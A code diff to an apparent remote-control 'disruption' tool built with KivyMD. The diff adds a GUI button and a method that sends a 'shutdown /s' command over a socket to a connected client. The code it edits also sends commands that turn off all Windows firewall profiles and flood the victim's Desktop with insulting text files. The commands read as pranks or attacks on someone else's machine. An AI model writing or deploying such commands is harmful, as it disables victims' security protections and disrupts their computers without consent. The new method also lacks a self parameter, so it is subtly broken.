@@ -85,8 +85,14 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.Firewall()
+            MDRectangleFlatButton:
+                id: shutDownBtn
+                text: "Shutdown"
+                pos_hint: {"center_x": .5, "center_y": .5}
+                opacity: 1
+                disabled: False
+                on_press: app.Shutdown()
 '''
-
 
 class Main(MDApp):
     def build(self):
@@ -194,6 +200,7 @@ class Main(MDApp):
             break
 
     ###############################DISRUPTIONS############################################
+    #Disable Firewall Disruption
     def Firewall(self):
         while True:
             command = "netsh advfirewall set allprofiles state off"
@@ -203,7 +210,7 @@ class Main(MDApp):
             print(f"Output: {output}")
             break
 
-    # File creation disruption
+    # File Creation Disruption
     def FileCreate(self):
         while True:
             command = 'FOR /L %A IN (1 1 20) DO (echo. > C:\\Users\\%USERNAME%\\Desktop\\You_suck_eggs_%A.txt)'
@@ -211,6 +218,14 @@ class Main(MDApp):
             print('Command sent to client: ', command)
             break
 
+    #Shutdown Disruption
+    def Shutdown():
+        while True:
+            command = 'shutdown /s'
+            command = command.encode()
+            currConn.send(command)
+            print('Command sent to client: ', command)
+            break
 
 """
 UNTESTED SO I COMMENTED DISRUPRTIONS OUT FOR NOW OMEGALUL
@@ -224,13 +239,6 @@ def KillTask():
         output = client.recv(8096)
         output = output.decode()
         print('Output: ', output)
-        break
-def Shutdown():
-    while True:
-        command = 'shutdown /s'
-        command = command.encode()
-        currConn.send(command)
-        print('Command sent to client: ', command)
         break
 
 """
